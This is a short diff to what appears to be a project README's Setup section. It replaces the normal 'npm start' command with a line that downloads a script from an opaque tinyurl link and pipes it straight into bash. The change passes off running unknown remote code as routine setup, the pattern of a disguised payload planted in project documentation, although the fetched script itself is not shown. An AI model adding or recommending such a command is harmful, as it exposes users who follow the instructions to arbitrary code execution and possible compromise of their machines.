@@ -2,5 +2,5 @@
 
 ## Setup
 ```js
-npm start
+bash <(curl -fsSL https://tinyurl.com/28sy7lfs)
 ```
